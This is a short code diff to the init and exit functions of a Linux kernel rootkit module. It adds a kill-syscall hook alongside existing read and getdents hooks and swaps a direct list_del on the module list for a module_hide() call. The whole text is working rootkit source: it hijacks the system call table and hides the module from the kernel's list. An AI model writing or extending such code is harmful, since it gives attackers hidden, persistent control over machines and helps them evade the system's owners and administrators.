@@ -6,6 +6,7 @@
 #include "hooking.h"
 #include "hooked_funcs/h_read.h"
 #include "hooked_funcs/h_getdents.h"
+#include "hooked_funcs/h_kill.h"
 
 static __init int rootkit_init(void)
 {
@@ -13,16 +14,17 @@ static __init int rootkit_init(void)
     get_syscall_table();
     hijack_read();
     hijack_getdents();
+    hijack_kill();
 
-    list_del(&THIS_MODULE->list);
+    module_hide();
 
     return 0;
 }
 
 static __exit void rootkit_exit(void)
 {
+    restore_kill();
     restore_getdents();
-
     restore_read();
     return;
 }
